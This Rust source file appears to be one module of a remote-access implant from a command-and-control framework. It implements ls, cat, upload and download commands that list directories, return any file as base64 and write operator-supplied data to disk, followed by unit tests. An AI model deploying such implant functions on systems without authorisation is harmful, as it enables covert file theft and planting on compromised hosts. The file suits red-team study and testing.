use std::{
    fs::{OpenOptions, read, read_dir},
    io::{BufWriter, Write},
};

use base64::Engine;
use base64::engine::general_purpose::STANDARD;

use crate::commands::{CommandMeta, CommandResult, ImplantCommand, ImplantContext};

pub struct LsCommand;
pub struct CatCommand;
pub struct UploadCommand;
pub struct DownloadCommand;

impl LsCommand {
    const META: CommandMeta = CommandMeta {
        name: "ls",
        description: "List files in a directory",
        usage: "ls <dir>",
    };
}

impl CatCommand {
    const META: CommandMeta = CommandMeta {
        name: "cat",
        description: "Read a file",
        usage: "cat <file_path>",
    };
}

impl UploadCommand {
    const META: CommandMeta = CommandMeta {
        name: "upload",
        description: "Upload a file",
        usage: "upload <file_data> <remote_file_path>",
    };
}

impl DownloadCommand {
    const META: CommandMeta = CommandMeta {
        name: "download",
        description: "Download a file",
        usage: "download <remote_file_path> <local_file_path>",
    };
}

impl ImplantCommand for LsCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
        let path = if args.is_empty() {
            ctx.cwd.clone()
        } else {
            args[0].clone()
        };

        let entries = match read_dir(&path) {
            Ok(e) => e,
            Err(err) => {
                return CommandResult {
                    success: false,
                    output: err.to_string(),
                };
            }
        };

        let mut output = String::new();

        for entry in entries.flatten() {
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            let prefix = if file_type.is_dir() { "d" } else { "f" };
            let name = entry.file_name().to_string_lossy().to_string();
            let Ok(meta) = entry.metadata() else { continue };
            let perms = meta.permissions();
            let size = meta.len();
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mode = perms.mode();
                output.push_str(&format!(
                    "{prefix} {:o} {:>8}  {name}\n",
                    mode & 0o777,
                    size
                ));
            }

            #[cfg(not(unix))]
            {
                let ro = if perms.readonly() { "r-" } else { "rw" };
                output.push_str(&format!("{prefix} {ro} {:>8}  {name}\n", size));
            }
        }

        CommandResult {
            success: true,
            output,
        }
    }
}

impl ImplantCommand for CatCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
        if args.is_empty() {
            return CommandResult {
                success: false,
                output: "usage cat <file_path>".to_string(),
            };
        }
        let full_path = ctx.resolve_path(&args[0]);

        let output = match read(full_path) {
            Ok(bytes) => STANDARD.encode(&bytes),
            Err(err) => {
                return CommandResult {
                    success: false,
                    output: err.to_string(),
                };
            }
        };

        CommandResult {
            success: true,
            output,
        }
    }
}

impl ImplantCommand for UploadCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
        if args.is_empty() {
            return CommandResult {
                success: false,
                output: "usage upload <file_data> <file_path>".to_string(),
            };
        }

        let Ok(decoded) = STANDARD.decode(&args[0]) else {
            return CommandResult {
                success: false,
                output: "invalid encoding".to_string(),
            };
        };

        let file_path = ctx.resolve_path(&args[1]);

        let Ok(file) = OpenOptions::new()
            .write(true)
            .truncate(true)
            .create(true)
            .open(&file_path)
        else {
            return CommandResult {
                success: false,
                output: format!("failed to open {}", &file_path),
            };
        };

        let mut writer = BufWriter::new(file);
        match writer.write_all(decoded.as_ref()) {
            Ok(_) => {}
            Err(e) => {
                return CommandResult {
                    success: false,
                    output: e.to_string(),
                };
            }
        }
        match writer.flush() {
            Ok(_) => {}
            Err(e) => {
                return CommandResult {
                    success: false,
                    output: e.to_string(),
                };
            }
        }

        CommandResult {
            success: true,
            output: "".to_string(),
        }
    }
}

impl ImplantCommand for DownloadCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
        if args.is_empty() {
            return CommandResult {
                success: false,
                output: "usage download <file_path>".to_string(),
            };
        }

        let full_path = ctx.resolve_path(&args[0]);

        let output = match read(full_path) {
            Ok(bytes) => STANDARD.encode(&bytes),
            Err(err) => {
                return CommandResult {
                    success: false,
                    output: err.to_string(),
                };
            }
        };

        CommandResult {
            success: true,
            output,
        }
    }
}

#[cfg(test)]
mod test {
    use super::*;
    use crate::commands::test_context;

    #[test]
    fn test_ls() {
        let cmd = LsCommand;
        let mut ctx = test_context();
        let dir = std::env::temp_dir();
        let args = &[dir.to_string_lossy().to_string()];

        let result = cmd.execute(args, &mut ctx);
        assert_eq!(result.success, true);
        assert!(!result.output.is_empty());
    }

    #[test]
    fn test_ls_invalid_path() {
        let cmd = LsCommand;
        let mut ctx = test_context();
        let dir = "an invalid dir";
        let args = &[dir.to_string()];

        let result = cmd.execute(args, &mut ctx);
        assert_eq!(result.success, false);
        assert!(!result.output.is_empty());
    }

    #[test]
    fn test_cat_file() {
        let path = std::env::temp_dir().join("konq_test_cat.txt");
        std::fs::write(&path, "test content").unwrap();
        let cmd = CatCommand;
        let mut ctx = test_context();
        let result = cmd.execute(&[path.to_string_lossy().to_string()], &mut ctx);
        assert!(result.success);
        // output is base64 encoded
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&result.output)
            .unwrap();
        assert_eq!(decoded, b"test content");
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn test_cat_non_existent_file() {
        let cmd = CatCommand;
        let mut ctx = test_context();
        let result = cmd.execute(&["im_totally_invalid.txt".to_string()], &mut ctx);
        assert_eq!(result.success, false);
    }

    #[test]
    fn test_upload_and_download_file() {
        let path = std::env::temp_dir().join("test.txt");
        let cmd = UploadCommand;
        let download = DownloadCommand;
        let mut ctx = test_context();

        let encoded = "SGVsbG8=".to_string();

        let result = cmd.execute(
            &[encoded.clone(), path.to_string_lossy().to_string()],
            &mut ctx,
        );
        assert_eq!(result.success, true);

        let result = download.execute(&[path.to_string_lossy().to_string()], &mut ctx);
        assert_eq!(result.success, true);
        assert_eq!(result.output, encoded);

        std::fs::remove_file(&path).unwrap();
    }
}
